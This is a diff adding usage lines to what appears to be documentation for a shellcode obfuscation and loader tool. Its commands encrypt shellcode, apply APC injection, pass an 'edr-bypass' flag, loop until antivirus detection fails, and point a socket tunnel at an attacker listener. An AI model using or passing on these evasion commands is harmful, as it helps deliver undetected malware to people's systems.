@@ -195,6 +195,11 @@ python main.py -i shellcode.bin -o output/payload --encryption xor --loader rust
 python main.py -i shellcode.bin -o output/payload \
     --encryption chacha20 --loader go -t apc
 
+# Stable Pro-Level Network Bridge (Bypasses shellcode crashes)
+# This uses the stable C-based socket tunnel instead of raw shellcode.
+# Update the IP in core/obfuscator.py:234 to match your listener.
+python main.py -i output/test_shell.bin -o output/PRO_STABLE --encryption aes --edr-bypass full
+
 # Iterative obfuscation until AV bypass (max 10 attempts)
 python main.py -i shellcode.bin -o output/payload --test-av --iterations 10
 
